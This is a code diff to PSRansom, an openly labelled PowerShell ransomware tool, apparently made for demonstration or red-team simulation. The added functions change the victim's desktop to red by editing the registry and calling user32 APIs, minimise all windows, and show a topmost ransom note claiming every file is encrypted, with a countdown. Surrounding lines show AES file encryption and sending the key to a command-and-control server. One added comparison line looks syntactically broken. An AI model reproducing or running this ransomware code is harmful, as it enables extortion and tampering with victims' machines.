@@ -133,6 +133,105 @@ function Invoke-AESEncryption {
       $shaManaged.Dispose()
       $aesManaged.Dispose()}}
 
+function RemoveWallpaper {
+$code = @"
+using System;
+using System.Drawing;
+using System.Runtime.InteropServices;
+using Microsoft.Win32;
+ 
+namespace CurrentUser { public class Desktop {
+[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+private static extern int SystemParametersInfo(int uAction, int uParm, string lpvParam, int fuWinIni);
+[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+private static extern int SetSysColors(int cElements, int[] lpaElements, int[] lpRgbValues);
+public const int UpdateIniFile = 0x01; public const int SendWinIniChange = 0x02;
+public const int SetDesktopBackground = 0x0014; public const int COLOR_DESKTOP = 1;
+public int[] first = {COLOR_DESKTOP};
+
+public static void RemoveWallPaper(){
+SystemParametersInfo( SetDesktopBackground, 0, "", SendWinIniChange | UpdateIniFile );
+RegistryKey regkey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
+regkey.SetValue(@"WallPaper", 0); regkey.Close();}
+
+public static void SetBackground(byte r, byte g, byte b){ int[] elements = {COLOR_DESKTOP};
+
+RemoveWallPaper();
+System.Drawing.Color color = System.Drawing.Color.FromArgb(r,g,b);
+int[] colors = { System.Drawing.ColorTranslator.ToWin32(color) };
+
+SetSysColors(elements.Length, elements, colors);
+RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Colors", true);
+key.SetValue(@"Background", string.Format("{0} {1} {2}", color.R, color.G, color.B));
+key.Close();}}}
+ 
+"@
+try { Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing.dll }
+finally {[CurrentUser.Desktop]::SetBackground(250, 25, 50)}}
+
+function PopUpRansom {
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
+[void] [System.Windows.Forms.Application]::EnableVisualStyles() 
+
+$shell = New-Object -ComObject "Shell.Application"
+$shell.minimizeall()
+
+$form = New-Object system.Windows.Forms.Form 
+$form.Size = New-Object System.Drawing.Size(900,600) 
+$form.BackColor = "Black" 
+$form.MaximizeBox = $false 
+$form.StartPosition = "CenterScreen" 
+$form.WindowState = "Normal"
+$form.Topmost = $true
+$form.FormBorderStyle = "Fixed3D"
+$form.Text = "PSRansom by @JoelGMSec - https://github.com/JoelGMSec/PSRansom" 
+
+$img = [System.Drawing.Image]::Fromfile("C:\Users\Joel\Desktop\PSRansom\Demo\PSRansom.jpg")
+$pictureBox = new-object Windows.Forms.PictureBox
+$pictureBox.Width = 920
+$pictureBox.Height = 370
+$pictureBox.SizeMode = "StretchImage"
+$pictureBox.Image = $img
+$form.controls.add($pictureBox)
+
+$label = New-Object System.Windows.Forms.Label
+$label.ForeColor = "Red"
+$label.Text = "All your files have been encrypted by PSRansom!" 
+$label.AutoSize = $true 
+$label.Location = New-Object System.Drawing.Size(50,400) 
+$font = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
+$form.Font = $Font 
+$form.Controls.Add($label) 
+$formIcon = New-Object system.drawing.icon ("C:\Users\Joel\Desktop\PSRansom\Demo\PSRansom.ico") 
+$form.Icon = $formicon 
+ 
+$label1 = New-Object System.Windows.Forms.Label
+$label1.ForeColor = "White"
+$label1.Text = "But don't worry, you can still recover them with the recovery key :)" 
+$label1.AutoSize = $true 
+$label1.Location = New-Object System.Drawing.Size(50,450)
+$font1 = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
+$form.Font = $Font1
+$form.Controls.Add($label1) 
+
+$delay = 15
+$counter_Label = New-Object System.Windows.Forms.Label
+$counter_Label.Location = New-Object System.Drawing.Size(50,500) 
+$counter_Label.AutoSize = $true 
+$counter_Label.ForeColor = "Cyan"
+$form.Controls.Add($Counter_Label)
+
+while ($delay -ge 0){
+$form.Show()
+$counter_Label.Text = "Seconds Remaining: $($delay)"
+$warningfont = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
+$counter_Label.Font = $warningfont
+if ($delay -lt 10){ $Counter_Label.ForeColor = "Yellow" }
+if ($delay -lt 6){ $Counter_Label.ForeColor = "Red" }
+start-sleep 1 ; $delay -= 1 }
+$form.Close()}
+
 function R64Encoder { 
    if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
    if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
@@ -213,4 +312,7 @@ else {
    if (!$C2Status) { Write-Host "[+] Saving logs and key in readme.txt.." -ForegroundColor Blue }
    else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue ; SendOK }}
 
+   if ($args like -demo) { RemoveWallpaper ; PopUpRansom }
+
 sleep 1 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
+               
